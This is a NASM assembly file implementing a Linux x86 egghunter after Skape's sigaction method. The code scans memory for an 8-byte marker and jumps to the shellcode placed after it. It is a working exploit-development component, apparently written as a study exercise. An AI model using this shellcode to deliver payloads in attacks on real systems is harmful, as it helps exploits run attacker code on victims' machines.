; Filename: egghunter-sigaction.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Purpose: Linux x86 Egghunter (Skape's sigaction implementation)
; Reference: 	Safely Searching Process Virtual Address Space
; 		http://hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start			

section .text
_start:

incpage:
	or cx, 0xfff	; Increase page
incaddr:
	inc ecx		; ECX = address from where 16 bytes will be checked
			; 	for validity

	jz incaddr	; Skip if ecx = 0 to avoid a segfault

	push 0x43
	pop eax		; EAX = SYS_SIGACTION (0x43)
	int 0x80	; Exec syscall
	
	cmp al, 0xf2	; Check result,
	jz incpage	; increase page if addresses not valid
	
	mov eax, 0xefbeadde	; Egg = twice this value contiguosly 
				; 	in memory

	mov edi, ecx	; Move address to check to edi

	scasd		; Check for egg presence (1st half) in edi
			; This instruction advances edi 4 bytes
	jnz incaddr	; If value does not match, increase address
	
	scasd		; Check for egg presence (2nd half) in edi
	jnz incaddr	; If value does not match, increase address

	jmp edi		; If this is reached, egg was found
			; Directly jump to edi (it points to the shellcode
			; since it was increased by 4 with the las scasd)
			; by 4 after the las scasd
